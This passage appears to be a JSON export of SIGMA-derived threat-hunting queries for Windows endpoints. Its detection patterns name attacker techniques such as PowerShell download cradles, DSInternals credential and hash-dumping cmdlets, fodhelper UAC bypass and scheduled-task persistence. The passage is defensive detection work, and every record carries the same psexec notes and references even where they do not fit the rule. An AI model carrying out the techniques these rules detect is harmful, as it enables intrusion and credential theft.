            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"UtilityFunctions.ps1\" or tgt.process.cmdline contains \"RegSnapin \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 767
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Suspicious Desktopimgdownldr Command",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" /lockscreenurl:\" and (not (tgt.process.cmdline contains \".jpg\" or tgt.process.cmdline contains \".jpeg\" or tgt.process.cmdline contains \".png\"))) or (tgt.process.cmdline contains \"reg delete\" and tgt.process.cmdline contains \"\\PersonalizationCSP\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 768
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1055"
            ],
            "name": "Suspicious Rundll32 Invoking Inline VBScript",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"rundll32.exe\" and tgt.process.cmdline contains \"Execute\" and tgt.process.cmdline contains \"RegRead\" and tgt.process.cmdline contains \"window.close\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 769
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects when 'DllRegisterServer' is called in the commandline and the image is not rundll32. This could mean that the 'rundll32' utility has been renamed in order to avoid detection",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potential Renamed Rundll32 Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"DllRegisterServer\" and (not tgt.process.image.path contains \"\\rundll32.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 770
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious execution of the Qemu utility in a Windows environment.\nThreat actors have leveraged this utility and this technique for achieving network access as reported by Kaspersky.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1090",
                "t1572"
            ],
            "name": "Potentially Suspicious Usage Of Qemu",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"-m 1M\" or tgt.process.cmdline contains \"-m 2M\" or tgt.process.cmdline contains \"-m 3M\") and (tgt.process.cmdline contains \"restrict=off\" and tgt.process.cmdline contains \"-netdev \" and tgt.process.cmdline contains \"connect=\" and tgt.process.cmdline contains \"-nographic\")) and (not (tgt.process.cmdline contains \" -cdrom \" or tgt.process.cmdline contains \" type=virt \" or tgt.process.cmdline contains \" -blockdev \"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 771
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution and usage of the DSInternals PowerShell module. Which can be used to perform what might be considered as suspicious activity such as dumping DPAPI backup keys or manipulating NTDS.DIT files.\nThe DSInternals PowerShell Module exposes several internal features of Active Directory and Azure Active Directory. These include FIDO2 and NGC key auditing, offline ntds.dit file manipulation, password auditing, DC recovery from IFM backups and password hash calculation.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "DSInternals Suspicious PowerShell Cmdlets",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Add-ADDBSidHistory\" or tgt.process.cmdline contains \"Add-ADNgcKey\" or tgt.process.cmdline contains \"Add-ADReplNgcKey\" or tgt.process.cmdline contains \"ConvertFrom-ADManagedPasswordBlob\" or tgt.process.cmdline contains \"ConvertFrom-GPPrefPassword\" or tgt.process.cmdline contains \"ConvertFrom-ManagedPasswordBlob\" or tgt.process.cmdline contains \"ConvertFrom-UnattendXmlPassword\" or tgt.process.cmdline contains \"ConvertFrom-UnicodePassword\" or tgt.process.cmdline contains \"ConvertTo-AADHash\" or tgt.process.cmdline contains \"ConvertTo-GPPrefPassword\" or tgt.process.cmdline contains \"ConvertTo-KerberosKey\" or tgt.process.cmdline contains \"ConvertTo-LMHash\" or tgt.process.cmdline contains \"ConvertTo-MsoPasswordHash\" or tgt.process.cmdline contains \"ConvertTo-NTHash\" or tgt.process.cmdline contains \"ConvertTo-OrgIdHash\" or tgt.process.cmdline contains \"ConvertTo-UnicodePassword\" or tgt.process.cmdline contains \"Disable-ADDBAccount\" or tgt.process.cmdline contains \"Enable-ADDBAccount\" or tgt.process.cmdline contains \"Get-ADDBAccount\" or tgt.process.cmdline contains \"Get-ADDBBackupKey\" or tgt.process.cmdline contains \"Get-ADDBDomainController\" or tgt.process.cmdline contains \"Get-ADDBGroupManagedServiceAccount\" or tgt.process.cmdline contains \"Get-ADDBKdsRootKey\" or tgt.process.cmdline contains \"Get-ADDBSchemaAttribute\" or tgt.process.cmdline contains \"Get-ADDBServiceAccount\" or tgt.process.cmdline contains \"Get-ADDefaultPasswordPolicy\" or tgt.process.cmdline contains \"Get-ADKeyCredential\" or tgt.process.cmdline contains \"Get-ADPasswordPolicy\" or tgt.process.cmdline contains \"Get-ADReplAccount\" or tgt.process.cmdline contains \"Get-ADReplBackupKey\" or tgt.process.cmdline contains \"Get-ADReplicationAccount\" or tgt.process.cmdline contains \"Get-ADSIAccount\" or tgt.process.cmdline contains \"Get-AzureADUserEx\" or tgt.process.cmdline contains \"Get-BootKey\" or tgt.process.cmdline contains \"Get-KeyCredential\" or tgt.process.cmdline contains \"Get-LsaBackupKey\" or tgt.process.cmdline contains \"Get-LsaPolicy\" or tgt.process.cmdline contains \"Get-SamPasswordPolicy\" or tgt.process.cmdline contains \"Get-SysKey\" or tgt.process.cmdline contains \"Get-SystemKey\" or tgt.process.cmdline contains \"New-ADDBRestoreFromMediaScript\" or tgt.process.cmdline contains \"New-ADKeyCredential\" or tgt.process.cmdline contains \"New-ADNgcKey\" or tgt.process.cmdline contains \"New-NTHashSet\" or tgt.process.cmdline contains \"Remove-ADDBObject\" or tgt.process.cmdline contains \"Save-DPAPIBlob\" or tgt.process.cmdline contains \"Set-ADAccountPasswordHash\" or tgt.process.cmdline contains \"Set-ADDBAccountPassword\" or tgt.process.cmdline contains \"Set-ADDBBootKey\" or tgt.process.cmdline contains \"Set-ADDBDomainController\" or tgt.process.cmdline contains \"Set-ADDBPrimaryGroup\" or tgt.process.cmdline contains \"Set-ADDBSysKey\" or tgt.process.cmdline contains \"Set-AzureADUserEx\" or tgt.process.cmdline contains \"Set-LsaPolicy\" or tgt.process.cmdline contains \"Set-SamAccountPasswordHash\" or tgt.process.cmdline contains \"Set-WinUserPasswordHash\" or tgt.process.cmdline contains \"Test-ADDBPasswordQuality\" or tgt.process.cmdline contains \"Test-ADPasswordQuality\" or tgt.process.cmdline contains \"Test-ADReplPasswordQuality\" or tgt.process.cmdline contains \"Test-PasswordQuality\" or tgt.process.cmdline contains \"Unlock-ADDBAccount\" or tgt.process.cmdline contains \"Write-ADNgcKey\" or tgt.process.cmdline contains \"Write-ADReplNgcKey\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 772
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious process run from unusual locations",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Suspicious Process Start Locations",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \":\\RECYCLER\\\" or tgt.process.image.path contains \":\\SystemVolumeInformation\\\") or (tgt.process.image.path contains \"C:\\Windows\\Tasks\\\" or tgt.process.image.path contains \"C:\\Windows\\debug\\\" or tgt.process.image.path contains \"C:\\Windows\\fonts\\\" or tgt.process.image.path contains \"C:\\Windows\\help\\\" or tgt.process.image.path contains \"C:\\Windows\\drivers\\\" or tgt.process.image.path contains \"C:\\Windows\\addins\\\" or tgt.process.image.path contains \"C:\\Windows\\cursors\\\" or tgt.process.image.path contains \"C:\\Windows\\system32\\tasks\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 773
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious children spawned via the Windows Terminal application which could be a sign of persistence via WindowsTerminal (see references section)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious WindowsTerminal Child Processes",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((src.process.image.path contains \"\\WindowsTerminal.exe\" or src.process.image.path contains \"\\wt.exe\") and ((tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\csc.exe\") or (tgt.process.image.path contains \"C:\\Users\\Public\\\" or tgt.process.image.path contains \"\\Downloads\\\" or tgt.process.image.path contains \"\\Desktop\\\" or tgt.process.image.path contains \"\\AppData\\Local\\Temp\\\" or tgt.process.image.path contains \"\\Windows\\TEMP\\\") or (tgt.process.cmdline contains \" iex \" or tgt.process.cmdline contains \" icm\" or tgt.process.cmdline contains \"Invoke-\" or tgt.process.cmdline contains \"Import-Module \" or tgt.process.cmdline contains \"ipmo \" or tgt.process.cmdline contains \"DownloadString(\" or tgt.process.cmdline contains \" /c \" or tgt.process.cmdline contains \" /k \" or tgt.process.cmdline contains \" /r \"))) and (not ((tgt.process.cmdline contains \"Import-Module\" and tgt.process.cmdline contains \"Microsoft.VisualStudio.DevShell.dll\" and tgt.process.cmdline contains \"Enter-VsDevShell\") or (tgt.process.cmdline contains \"\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_\" and tgt.process.cmdline contains \"\\LocalState\\settings.json\") or (tgt.process.cmdline contains \"C:\\Program Files\\Microsoft Visual Studio\\\" and tgt.process.cmdline contains \"\\Common7\\Tools\\VsDevCmd.bat\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 774
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious command line flags that let the user set a target user and command as e.g. seen in PsExec-like tools",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious RunAs-Like Flag Combination",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" -u system \" or tgt.process.cmdline contains \" --user system \" or tgt.process.cmdline contains \" -u NT\" or tgt.process.cmdline contains \" -u \\\"NT\" or tgt.process.cmdline contains \" -u 'NT\" or tgt.process.cmdline contains \" --system \" or tgt.process.cmdline contains \" -u administrator \") and (tgt.process.cmdline contains \" -c cmd\" or tgt.process.cmdline contains \" -c \\\"cmd\" or tgt.process.cmdline contains \" -c powershell\" or tgt.process.cmdline contains \" -c \\\"powershell\" or tgt.process.cmdline contains \" --command cmd\" or tgt.process.cmdline contains \" --command powershell\" or tgt.process.cmdline contains \" -c whoami\" or tgt.process.cmdline contains \" -c wscript\" or tgt.process.cmdline contains \" -c cscript\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 775
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Schtask creations that point to a suspicious folder or an environment variable often used by malware",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "Schedule Task Creation From Env Variable Or Potentially Suspicious Path Via Schtasks.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((((tgt.process.image.path contains \"\\schtasks.exe\" and tgt.process.cmdline contains \" /create \") and (tgt.process.cmdline contains \":\\Perflogs\" or tgt.process.cmdline contains \":\\Users\\All Users\\\" or tgt.process.cmdline contains \":\\Users\\Default\\\" or tgt.process.cmdline contains \":\\Users\\Public\" or tgt.process.cmdline contains \":\\Windows\\Temp\" or tgt.process.cmdline contains \"\\AppData\\Local\\\" or tgt.process.cmdline contains \"\\AppData\\Roaming\\\" or tgt.process.cmdline contains \"%AppData%\" or tgt.process.cmdline contains \"%Public%\")) or (src.process.cmdline contains \"\\svchost.exe -k netsvcs -p -s Schedule\" and (tgt.process.cmdline contains \":\\Perflogs\" or tgt.process.cmdline contains \":\\Windows\\Temp\" or tgt.process.cmdline contains \"\\Users\\Public\" or tgt.process.cmdline contains \"%Public%\"))) and (not ((src.process.cmdline contains \"unattended.ini\" or tgt.process.cmdline contains \"update_task.xml\") or tgt.process.cmdline contains \"/Create /TN TVInstallRestore /TR\" or (tgt.process.cmdline contains \"/Create /Xml \\\"C:\\Users\\\" and tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\.CR.\" and tgt.process.cmdline contains \"Avira_Security_Installation.xml\") or ((tgt.process.cmdline contains \"/Create /F /TN\" and tgt.process.cmdline contains \"/Xml \" and tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\is-\" and tgt.process.cmdline contains \"Avira_\") and (tgt.process.cmdline contains \".tmp\\UpdateFallbackTask.xml\" or tgt.process.cmdline contains \".tmp\\WatchdogServiceControlManagerTimeout.xml\" or tgt.process.cmdline contains \".tmp\\SystrayAutostart.xml\" or tgt.process.cmdline contains \".tmp\\MaintenanceTask.xml\")) or (tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\" and tgt.process.cmdline contains \"/Create /TN \\\"klcp_update\\\" /XML \" and tgt.process.cmdline contains \"\\klcp_update_task.xml\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 776
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious winrar execution in a folder which is not the default installation folder",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1560"
            ],
            "name": "Winrar Execution in Non-Standard Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\rar.exe\" or tgt.process.image.path contains \"\\winrar.exe\") or tgt.process.displayName=\"Command line RAR\") and (not (tgt.process.image.path contains \"\\UnRAR.exe\" or (tgt.process.image.path contains \":\\Program Files (x86)\\WinRAR\\\" or tgt.process.image.path contains \":\\Program Files\\WinRAR\\\"))) and (not tgt.process.image.path contains \":\\Windows\\Temp\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 777
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the rare use of the command line tool shutdown to logoff a user",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1529"
            ],
            "name": "Suspicious Execution of Shutdown to Log Out",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\shutdown.exe\" and tgt.process.cmdline contains \"/l\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 778
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Use of the commandline to shutdown or reboot windows",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1529"
            ],
            "name": "Suspicious Execution of Shutdown",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\shutdown.exe\" and (tgt.process.cmdline contains \"/r \" or tgt.process.cmdline contains \"/s \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 779
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Identifies use of Fodhelper.exe to bypass User Account Control. Adversaries use this technique to execute privileged processes.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "Bypass UAC via Fodhelper.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\fodhelper.exe\") | columns ComputerName,tgt.process.user,tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 780
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of COM objects that can be abused to download files in PowerShell by CLSID",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Potential COM Objects Download Cradles Usage - Process Creation",
